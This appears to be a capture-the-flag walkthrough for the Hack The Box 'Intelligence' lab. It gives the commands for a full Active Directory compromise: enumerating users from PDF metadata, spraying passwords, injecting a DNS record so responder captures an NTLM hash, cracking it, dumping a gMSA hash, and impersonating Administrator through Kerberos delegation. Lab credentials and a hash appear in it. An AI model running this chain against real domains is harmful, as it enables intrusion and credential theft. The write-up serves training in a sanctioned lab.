![[Pasted image 20250430043649.png]]

with [[nmap]] we get that ports opens.

on web page of [[port 80]] we found two PDF documents we can download

![[Pasted image 20250430154752.png]]


using [[exiftool]] we can extract metadata from that documents.

![[Pasted image 20250430154857.png]]

and we find two different creators.

we can think that in `/documents` path exist more documents with that name format, so with the next one liner we can check and download all existent PDF documents very fast using [[Bash scripting]], [[wget]], [[xargs]]

```bash
for i in {2020..2022}; do for j in {01..12}; do for k in {01..30}; do echo "http://10.10.10.248/documents/$i-$j-$k-upload.pdf"; done; done; done | xargs -n 1 -P 20 wget
```

and we got all this documents...

![[Pasted image 20250430161356.png]]

with `exiftool` again we can check the creator and get a possible users list, we user [[sort]] to not get repetitions.

```bash
exiftool content/* | grep Creator | awk 'NF{print $NF}' | sort -u
```

And now, we can validate that users with [[kerbrute]]:

![[Pasted image 20250430162440.png]]

All users are valid.

With a valid user list we can try user [[GetNPUsers.py]] of [[Impacket]] to request a [[Ticket Granting Ticket (TGT)]].

```bash
GetNPUsers.py intelligence.htb/ -no-pass -usersfile ./data/users
```

![[Pasted image 20250430163322.png]]

But none has the configuration `UF_DONT_REQUIRE_PREAUTH` set.

Checking again the PDF, we can use [[pdftotext]] to extract text human readable. 

```bash
for i in $(ls ../pdf/); do pdftotext ../pdf/$i; done 
```

with this we get `.txt` files by each PDF.

If we search recursively by each file filtering by word `password`:

![[Pasted image 20250430164203.png]]
We find interesting file `2020-06-04-upload.txt`

![[Pasted image 20250430164540.png]]
we get a default password.

with [[netexec]] we can check whose password is.

```bash
 netexec smb 10.10.10.248 -u data/users -p data/passwords
```

![[Pasted image 20250430165104.png]]

The user `Tiffany.Molina` has this password.

We can user [[smbmap]] to try list shares resources.

```bash
smbmap -H 10.10.10.248 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876'
```

![[Pasted image 20250430180709.png]]

Searching in the `IT` folder we find a [[Powershell]] script

![[Pasted image 20250430181501.png]]

let's download it.

```bash
smbmap -H 10.10.10.248 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' --download IT/downdetector.ps1
```

And we have this:

![[Pasted image 20250430181623.png]]

We focus our attention in `web*`, the script are using [[Invoke-WebRequest]] to make a request to `DNS Records` which his names start with `web`.

Now, using [[dnstool.py]] we can inject a new `DNS record`

```bash
dnstool.py -u "intelligence.htb\Tiffany.Molina" -p "NewIntelligenceCorpUser9876" -r webtest  -a add -t A -d 10.10.16.2 10.10.10.248
```

![[Pasted image 20250430183502.png]]

Now, with [[responder]] we can listen on the network interface of Hack The Box to try get a `NTLM` hash.

```bash
responder -I tun0
```

And we got:

![[Pasted image 20250430184308.png]]

Ted Graves hash, we can try use [[JohnTheRipper]] to break that hash.

![[Pasted image 20250430184519.png]]

And we have new credentials `Ted.Graves:Mr.Teddy`

validation with `netexec`: 

![[Pasted image 20250430184825.png]]

It's valid.

No we going to use [[bloodhound]] and [[Neo4j]] to try get ways to convert us in admin user.

use [[bloodhound-python]] to collect information about the domain and upload that data in bloodhound.

![[Pasted image 20250430191331.png]]

and we got this, user `Ted.Graves` can read the GMSAP password of svc-int

With [[gMSADumpster.py]] tool we can try get a hash of user `svc-int`

```bash
gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -l 10.10.10.248 -d intelligence.htb
```

![[Pasted image 20250430192006.png]]

Now, with [[getST.py]] from [[Impacket]] we can try impersonate the user `Administrator`, but we need a `SPN` so lets get that with [[pywerview]]

```bash
pywerview get-netcomputer -u 'Ted.Graves' -p 'Mr.Teddy' -t 10.10.10.248 --full-data
```

and we're searching this:

![[Pasted image 20250430194737.png]]

now with `getST.py`:

```bash
getST.py -spn WWW/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int -hashes :b08e6a29a7f50ec81c11df8649e9d7df
```

and the output should say:

```
[*] Saving ticket in Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
```

with that file we can try authenticate using [[wmiexec.py]] from [[Impacket]] too.

first, we need export a environment variable called `KRB5CCNAME`

```bash
export KRB5CCNAME=Administrator.ccache
```

and

```bash
wmiexec.py dc.intelligence.htb -k -no-pass
```

![[Pasted image 20250501031806.png]]